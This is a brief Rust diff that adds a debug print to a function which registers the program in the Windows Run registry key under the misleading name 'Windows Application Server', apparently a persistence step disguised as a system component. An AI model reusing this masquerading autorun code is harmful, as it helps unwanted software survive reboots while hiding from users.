@@ -141,6 +141,7 @@ fn should_run() -> bool {
 fn ensure_autorun(path: &str) -> Result<()> {
     let hkcu = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
     let key = hkcu.open_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")?;
+    println!("aaa");
     key.set_value("Windows Application Server".to_string(), &path.to_string())?;
     Ok(())
 }
